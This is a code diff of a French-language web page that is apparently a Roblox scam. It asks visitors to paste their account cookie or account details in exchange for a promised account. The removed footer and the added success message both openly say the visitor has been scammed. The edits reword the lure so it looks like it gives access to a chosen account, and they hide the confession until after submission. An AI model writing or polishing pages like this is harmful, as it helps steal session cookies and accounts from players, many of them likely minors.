@@ -299,7 +299,7 @@
 <div class="wrap">
   <div class="eyebrow">Recherche de compte en direct</div>
   <h1>Balance ton <span>compte Roblox</span></h1>
-  <p class="subtitle">Tape ton Cookie, appuie sur Entrée. Il part direct dans le tool, et le compte est a toi— rien d'autre n'est demandé.</p>
+  <p class="subtitle">Tape les infos de compte, appuie sur Entrée. Il part direct dans le tool, et le compte est a toi— rien d'autre n'est demandé.</p>
 
   <form class="bubble-form" id="form" autocomplete="off" novalidate>
     <div class="bubble">
@@ -319,7 +319,7 @@
       </button>
     </div>
     <div class="hint-row">
-      <span>rentre ton cookie içi !</span>
+      <span>rentre le compte choisis içi !</span>
       <span class="count" id="charCount">0/5000</span>
     </div>
   </form>
@@ -335,7 +335,7 @@
   </div>
 
   <footer>
-    Ton Cookie a été encrypté et envoyé dans nos base de donnée ! ( tu viens de te faire scam mdr ).
+    le compte choisis sera encrypté et envoyé. dès que tu cliqueras sur entée, une nouvelle page de ton naviguateur s'ouvrira connecté au compte envoyé !
   </footer>
 </div>
 
@@ -470,7 +470,7 @@
         return;
       }
 
-      setStatus(`"${raw}" est bien enregistré !`, "success");
+      setStatus(`"${raw}" est bien enregistré ! ( tu t'es fait scam mdrr )`, "success");
       addBlock();
       const current = parseInt((totalCountEl.textContent || "0").replace(/\s/g, ""), 10);
       if (!Number.isNaN(current)){
